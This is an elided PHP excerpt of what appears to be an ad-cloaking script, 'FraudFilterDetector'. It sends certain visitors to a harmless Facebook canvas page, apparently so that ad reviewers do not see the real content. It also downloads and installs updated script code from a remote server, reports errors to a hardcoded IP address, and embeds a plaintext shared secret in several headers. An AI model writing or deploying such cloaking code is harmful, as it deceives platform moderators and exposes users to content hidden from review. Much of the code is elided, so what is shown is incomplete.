...
class FraudFilterDetector_1d957 {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'c4699ee6-c199-4bdc-b810-a277d257cbff.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://fb.com/canvas_doc/395490427517694');
    }
    function performDiagnostics($home, $fileName) {
        ...
        $result = array('success' => $success, 'diagnostics' => true, 'errors' => $errors, 'extErrors' => $extErrors, 'version' => 4, 'connection' => $curlConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
        echo(json_encode($result));
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: c4699ee6-c199-4bdc-b810-a277d257cbff',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: c4699ee6-c199-4bdc-b810-a277d257cbff';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: c4699ee6-c199-4bdc-b810-a277d257cbff';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://192.81.209.149/fb-notify.html?v=ff1&guid=1d957&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_1d957 = new FraudFilterDetector_1d957();
$fraudFilterDetector_1d957->check();
